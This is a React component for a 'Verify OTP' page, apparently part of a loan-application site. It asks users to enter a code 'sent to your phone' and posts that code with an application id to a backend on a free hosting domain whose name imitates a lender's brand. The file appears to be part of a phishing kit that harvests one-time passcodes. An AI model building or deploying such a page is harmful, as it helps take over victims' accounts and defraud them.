import { useState } from "react";
import { useParams } from "react-router-dom";
import axios from "axios";
import "../styles/app.css";

export default function OTP() {
  const { id } = useParams();

  // ✅ allow up to 6 digits
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);

  const handleChange = (value, index) => {
    if (isNaN(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    // move to next input
    if (value && index < otp.length - 1) {
      document.getElementById(`otp-${index + 1}`).focus();
    }
  };

  const handleSubmit = async () => {
    const code = otp.join("").trim();

    if (code.length < 5) {
      alert("Enter valid OTP");
      return;
    }

    try {
      await axios.post(
        "https://g-bayport-loans.onrender.com/apply/otp",
        {
          id,
          otp: code,
        }
      );

      alert("OTP submitted!");
      window.location.href = "/status";

    } catch (err) {
      console.error(err);
      alert("Error sending OTP");
    }
  };

  return (
    <div className="loan-container">
      <div className="card otp-container">

        <div className="header">
          <img src="/icon.jpeg" alt="logo" className="logo" />
          <h1>Verify OTP</h1>
          <p className="subtitle">
            Enter the code sent to your phone
          </p>
        </div>

        <div className="otp-inputs">
          {otp.map((digit, index) => (
            <input
              key={index}
              id={`otp-${index}`}
              maxLength="1"
              value={digit}
              onChange={(e) => handleChange(e.target.value, index)}
            />
          ))}
        </div>

        <button className="btn" onClick={handleSubmit}>
          Submit OTP
        </button>

      </div>
    </div>
  );
}